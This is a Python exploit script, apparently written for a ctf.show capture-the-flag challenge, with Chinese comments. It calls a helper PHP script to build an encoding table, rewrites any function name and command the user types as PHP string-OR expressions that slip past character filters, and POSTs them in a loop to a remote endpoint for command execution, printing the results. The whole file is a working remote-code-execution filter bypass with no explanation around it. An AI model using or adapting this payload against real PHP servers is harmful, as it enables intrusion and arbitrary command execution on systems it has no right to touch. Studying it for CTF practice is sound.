import requests
import urllib
from sys import *
import os

os.system("php rce_or.php")  # 没有将php写入环境变量需手动运行
"""
if (len(argv) != 2):
    print("=" * 50)
    print('USER：python exp.py <url>')
    print("eg：  python exp.py http://ctf.show/")
    print("=" * 50)
    exit(0)
"""
url = 'http://5f06d274-8b24-449c-83ac-cd2cee6284bd.challenge.ctf.show:8080/'


# url = argv[1]


def action(arg):
    s1 = ""
    s2 = ""
    for i in arg:
        f = open("rce.txt", "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i:
                # print(i)
                s1 += t[2:5]
                s2 += t[6:9]
                break
        f.close()
    output = "(\"" + s1 + "\"|\"" + s2 + "\")"
    return (output)


while True:
    param = action(input("\n[+] your function：")) + action(input("[+] your command："))
    # print(param,"\n")
    data = {
        'c': urllib.parse.unquote(param)
    }
    r = requests.post(url, data=data)
    print("\n[*] result:\n" + r.text)
